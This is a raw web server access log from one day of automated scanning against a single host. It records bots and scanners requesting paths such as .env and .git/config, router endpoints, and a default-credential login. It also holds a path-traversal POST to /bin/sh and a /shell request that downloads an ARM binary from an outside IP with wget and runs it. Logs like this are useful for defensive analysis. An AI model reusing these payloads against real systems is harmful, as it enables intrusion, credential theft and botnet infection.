87.120.113.55 - - [05/Feb/2025:00:22:36 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:03:03:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:03:03:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.255.166.90 - - [05/Feb/2025:03:24:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
216.218.206.67 - - [05/Feb/2025:03:29:04 +0000] "\x16\x03\x01" 400 524 "-" "-"
31.13.224.222 - - [05/Feb/2025:03:47:50 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; U; Android 6.0; he-il; Redmi Note 4X Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.7-g"
170.64.186.221 - - [05/Feb/2025:04:05:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0.1) Gecko/20100101 Firefox/66.0.1"
78.153.140.148 - - [05/Feb/2025:04:08:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:04:08:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.209.38.94 - - [05/Feb/2025:04:13:40 +0000] "GET /cgi-bin/jarrewrite.sh" 302 0 "-" "-"
111.89.69.82 - - [05/Feb/2025:04:14:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
120.138.12.53 - - [05/Feb/2025:04:17:55 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
87.110.20.203 - - [05/Feb/2025:04:21:03 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5" 400 524 "-" "-"
80.82.77.202 - - [05/Feb/2025:05:00:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:05:28:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:05:28:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
65.49.20.68 - - [05/Feb/2025:05:38:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
65.49.20.68 - - [05/Feb/2025:05:41:00 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
65.49.20.68 - - [05/Feb/2025:05:41:31 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.19.138.234 - - [05/Feb/2025:05:58:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.152.78.225 - - [05/Feb/2025:06:04:13 +0000] "MGLNDD_34.155.227.229_80\n" 400 524 "-" "-"
185.196.220.253 - - [05/Feb/2025:06:16:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
43.159.63.75 - - [05/Feb/2025:06:17:05 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.148.10.242 - - [05/Feb/2025:06:24:01 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:24:01 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale" "-"
45.148.10.242 - - [05/Feb/2025:06:31:45 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:31:45 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale" "-"
51.8.217.57 - - [05/Feb/2025:06:33:37 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.148 - - [05/Feb/2025:06:52:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:06:52:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.236.176.17 - - [05/Feb/2025:07:32:45 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
179.43.191.146 - - [05/Feb/2025:08:04:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.26 - - [05/Feb/2025:08:08:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.144 - - [05/Feb/2025:08:08:57 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
89.248.171.23 - - [05/Feb/2025:08:15:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:18 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:18 +0000] "GET /css/login.css HTTP/1.1" 200 644 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:18 +0000] "GET /js/login.js HTTP/1.1" 200 922 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:19 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1344 "http://34.155.227.229/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:19 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 564 "http://34.155.227.229/js/brand.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:19 +0000] "GET /config/brand.json HTTP/1.1" 200 366 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
89.248.171.23 - - [05/Feb/2025:08:15:19 +0000] "GET /brands/Hikvision.png HTTP/1.1" 200 328878 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
80.82.70.198 - - [05/Feb/2025:08:15:29 +0000] "GET /favicon.ico HTTP/1.1" 302 273 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
93.174.93.114 - - [05/Feb/2025:08:15:29 +0000] "GET / HTTP/1.1" 200 889 "http://34.155.227.229/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
185.242.226.80 - - [05/Feb/2025:08:31:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:08:35:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:08:35:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
128.199.196.44 - - [05/Feb/2025:08:40:03 +0000] "\x16\x03\x01\x01\x02\x01" 400 524 "-" "-"
128.199.196.44 - - [05/Feb/2025:08:40:03 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.94.145.107 - - [05/Feb/2025:08:43:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.107 - - [05/Feb/2025:08:43:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.107 - - [05/Feb/2025:08:43:45 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.107 - - [05/Feb/2025:08:43:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.107 - - [05/Feb/2025:08:43:48 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
79.35.101.147 - - [05/Feb/2025:09:02:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.144.212.139 - - [05/Feb/2025:09:05:07 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12"
172.104.11.34 - - [05/Feb/2025:09:53:44 +0000] "\x16\x03\x01\x01\n" 400 524 "-" "-"
172.104.11.34 - - [05/Feb/2025:09:53:45 +0000] "\x16\x03\x01\x01\n" 400 524 "-" "-"
78.153.140.148 - - [05/Feb/2025:09:55:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:09:55:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
13.91.177.99 - - [05/Feb/2025:09:59:50 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
66.240.205.34 - - [05/Feb/2025:10:00:20 +0000] "Gh0st\xad" 400 524 "-" "-"
147.185.133.20 - - [05/Feb/2025:10:00:22 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.148 - - [05/Feb/2025:10:01:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:10:01:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.104.210.105 - - [05/Feb/2025:10:01:47 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [05/Feb/2025:10:01:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.91.127.88 - - [05/Feb/2025:10:16:00 +0000] "GET /sitemap.xml HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.91.127.88 - - [05/Feb/2025:10:16:00 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0"
185.91.127.88 - - [05/Feb/2025:10:16:00 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Mozilla/5.0"
87.120.115.34 - - [05/Feb/2025:10:23:32 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
198.235.24.13 - - [05/Feb/2025:10:25:04 +0000] "\x16\x03\x01" 400 524 "-" "-"
198.235.24.13 - - [05/Feb/2025:10:25:04 +0000] "\x16\x03\x01" 400 524 "-" "-"
105.27.192.254 - - [05/Feb/2025:10:42:54 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
128.199.170.18 - - [05/Feb/2025:10:54:05 +0000] "\x16\x03\x01\x01\x02\x01" 400 524 "-" "-"
128.199.170.18 - - [05/Feb/2025:10:54:05 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
34.38.150.142 - - [05/Feb/2025:11:13:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
185.242.226.10 - - [05/Feb/2025:11:28:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
80.82.77.202 - - [05/Feb/2025:11:35:03 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
87.121.84.7 - - [05/Feb/2025:11:37:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
128.199.179.71 - - [05/Feb/2025:11:48:40 +0000] "\x16\x03\x01\x01\x02\x01" 400 524 "-" "-"
128.199.179.71 - - [05/Feb/2025:11:48:40 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
47.84.32.163 - - [05/Feb/2025:12:06:52 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Custom-AsyncHttpClient"
141.255.166.90 - - [05/Feb/2025:12:24:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
112.95.227.2 - - [05/Feb/2025:12:27:02 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Custom-AsyncHttpClient"
125.43.93.231 - - [05/Feb/2025:12:27:12 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 302 350 "-" "-"
128.199.252.54 - - [05/Feb/2025:12:43:01 +0000] "\x16\x03\x01\x01\x02\x01" 400 524 "-" "-"
128.199.252.54 - - [05/Feb/2025:12:43:01 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.209.241 - - [05/Feb/2025:12:46:41 +0000] "\x16\x03\x01\x01\x02\x01" 400 524 "-" "-"
128.199.209.241 - - [05/Feb/2025:12:46:41 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
87.121.84.7 - - [05/Feb/2025:13:03:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
148.153.45.238 - - [05/Feb/2025:13:16:54 +0000] "GET /ROMn HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:55 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/ROMn" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:55 +0000] "GET /w7ZU HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:55 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/w7ZU" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:57 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:57 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:57 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [05/Feb/2025:13:16:57 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
139.59.101.104 - - [05/Feb/2025:13:17:53 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
172.104.11.34 - - [05/Feb/2025:13:45:54 +0000] "\x16\x03\x01\x01\n" 400 524 "-" "-"
172.104.11.34 - - [05/Feb/2025:13:45:55 +0000] "\x16\x03\x01\x01\n" 400 524 "-" "-"
125.227.160.116 - - [05/Feb/2025:13:47:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.43 - - [05/Feb/2025:13:52:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.23.3.37 - - [05/Feb/2025:13:55:52 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
13.91.179.102 - - [05/Feb/2025:14:23:18 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /html/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /public/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /build/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /admin/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /main/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /administrator/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /backup/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /frontend/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /dist/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /cms/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:15:01:10 +0000] "GET /beta/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
